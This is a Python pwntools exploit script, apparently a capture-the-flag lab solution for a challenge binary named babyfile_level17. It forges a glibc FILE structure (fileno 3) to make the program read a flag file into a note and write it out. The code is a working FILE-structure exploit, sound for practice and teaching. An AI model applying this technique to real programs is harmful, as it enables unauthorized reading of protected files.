
from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level17")
#p = gdb.debug("/challenge/babyfile_level17")
binary = ELF("/challenge/babyfile_level17")

p.recv()

# dummy note
p.sendline(b'new_note')
p.sendline(b'0')
p.sendline(b'100')
print(p.recv())

# open flag
p.sendline(b'open_flag')
p.recv()

# open_file & write flag into note
p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()

fs = FileStructure()
fs.flags = 0xfbad240a
fs.fileno = 3
payload = bytes(fs)[:0x74]
p.send(payload)
p.recv()

p.sendline(b'read_file')
p.sendline(b'0')
p.recv()

# write_file to babyfile.txt
p.sendline(b'open_file')

p.sendline(b'write_file')
p.sendline(b'0')
p.recv()

p.sendline(b'close_file')

p.interactive()
